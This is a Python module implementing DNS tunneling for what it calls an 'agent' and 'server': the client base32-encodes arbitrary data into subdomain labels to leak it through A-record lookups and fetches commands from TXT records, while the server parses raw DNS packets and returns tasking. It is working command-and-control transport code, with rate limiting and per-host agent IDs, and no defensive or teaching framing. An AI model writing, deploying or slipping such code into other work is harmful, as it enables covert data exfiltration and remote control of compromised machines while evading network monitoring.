"""DNS tunneling over TXT/A records — agent and server protocol handlers."""

import base64
import socket
import struct
import time
from typing import Any, Optional


class DnsClientProtocol:
    """Agent-side DNS client — sends A-record queries, receives TXT commands."""

    _LABEL_MAX = 55
    _RATE_LIMIT = 1.0

    def __init__(self, domain: str):
        self._domain = domain.rstrip('.')
        seed = struct.pack('>I', abs(hash(socket.gethostname())) & 0xFFFFFFFF)
        self._agent_id = base64.b32encode(seed).decode().rstrip('=').lower()[:8]
        self._task_id = 0
        self._last_send = 0.0

    def _wait_rate(self):
        elapsed = time.monotonic() - self._last_send
        if elapsed < self._RATE_LIMIT:
            time.sleep(self._RATE_LIMIT - elapsed)
        self._last_send = time.monotonic()

    def send(self, data: Any) -> None:
        """Chunk data into base32 labels and tunnel via gethostbyname."""
        raw = data if isinstance(data, bytes) else str(data).encode()
        encoded = base64.b32encode(raw).decode().rstrip('=').lower()
        chunks = [encoded[i:i + self._LABEL_MAX]
                  for i in range(0, len(encoded), self._LABEL_MAX)]
        for seq, chunk in enumerate(chunks):
            self._wait_rate()
            q = f"{self._agent_id}.{seq:x}.{len(chunks):x}.{chunk}.{self._domain}"
            try:
                socket.gethostbyname(q)
            except socket.gaierror:
                pass

    def recv(self) -> Optional[str]:
        """Query TXT record and decode server response."""
        self._wait_rate()
        self._task_id += 1
        try:
            import dns.resolver
            answers = dns.resolver.resolve(
                f"task.{self._agent_id}.{self._domain}", 'TXT')
            for rdata in answers:
                text = ''.join(s.decode(errors='ignore') for s in rdata.strings)
                return _b32_decode(text).decode(errors='ignore')
        except Exception:
            pass
        return None


class DnsServerProtocol:
    """Server-side handler — parses DNS queries, extracts agent data,
    builds TXT/A response packets from scratch."""

    def __init__(self, domain: str):
        self._domain = domain.rstrip('.').lower().encode()
        self._domain_labels = self._domain.decode().split('.')
        self._label_count = len(self._domain_labels)

    def parse_query(self, data: bytes) -> Optional[dict]:
        """Parse raw DNS packet; returns dict with trans_id,qtype,labels,
        domain_str,agent_id,seq,total,payload or None."""
        if len(data) < 12:
            return None
        trans_id = data[:2]
        if struct.unpack_from('>H', data, 4)[0] == 0:
            return None
        labels, offset = self._parse_name(data, 12)
        if offset + 4 > len(data):
            return None
        qtype = struct.unpack_from('>H', data, offset)[0]
        domain_str = '.'.join(labels).lower()
        result = {'trans_id': trans_id, 'qtype': qtype, 'labels': labels,
                  'domain_str': domain_str, 'agent_id': '', 'payload': '',
                  'seq': -1, 'total': -1}
        if not domain_str.endswith('.' + self._domain.decode()):
            return result
        sub = labels[:len(labels) - self._label_count]
        if qtype == 1 and len(sub) >= 4:
            result['agent_id'] = sub[0]
            try:
                result['seq'] = int(sub[1], 16)
                result['total'] = int(sub[2], 16)
            except ValueError:
                pass
            result['payload'] = sub[3]
        elif qtype == 16 and len(sub) >= 2:
            result['agent_id'] = sub[-1]
        return result

    def _parse_name(self, data: bytes, offset: int) -> tuple[list[str], int]:
        """Parse DNS label sequence; supports compression pointers."""
        labels: list[str] = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                return labels, offset + 1
            if (length & 0xC0) == 0xC0:
                ptr = struct.unpack_from('>H', data, offset)[0] & 0x3FFF
                sub, _ = self._parse_name(data, ptr)
                return labels + sub, offset + 2
            offset += 1
            labels.append(data[offset:offset + length].decode(
                'ascii', errors='ignore'))
            offset += length
        return labels, offset

    def build_a_response(self, trans_id: bytes, labels: list[str]) -> bytes:
        """Build dummy A-record response pointing to 127.0.0.1."""
        return self._respond(trans_id, labels, 1, b'\x7f\x00\x00\x01')

    def build_txt_response(self, trans_id: bytes, labels: list[str],
                           payload: bytes) -> bytes:
        """Build TXT-record response with encoded payload."""
        return self._respond(trans_id, labels, 16,
                            bytes([len(payload)]) + payload, 16, 0x8180)

    def build_refused(self, trans_id: bytes, labels: list[str]) -> bytes:
        """Build REFUSED DNS response."""
        return self._respond(trans_id, labels, 1, b'', flags=0x8185)

    def _respond(self, trans_id: bytes, labels: list[str], rrtype: int,
                 rdata: bytes, qtype_req: int = 1, flags: int = 0x8180) -> bytes:
        header = trans_id + struct.pack('>HHHHH', flags, 1, 1, 0, 0)
        question = self._encode_name(labels) + struct.pack('>HH', qtype_req, 1)
        answer = b'\xc0\x0c' + struct.pack(
            '>HHIH', rrtype, 1, 60, len(rdata)) + rdata
        return header + question + answer

    @staticmethod
    def _encode_name(labels: list[str]) -> bytes:
        result = b''
        for label in labels:
            result += bytes([len(label)]) + label.encode('ascii', errors='ignore')
        return result + b'\x00'


def _b32_decode(encoded: str) -> bytes:
    pad = (8 - len(encoded) % 8) % 8
    return base64.b32decode(encoded.upper() + '=' * pad)
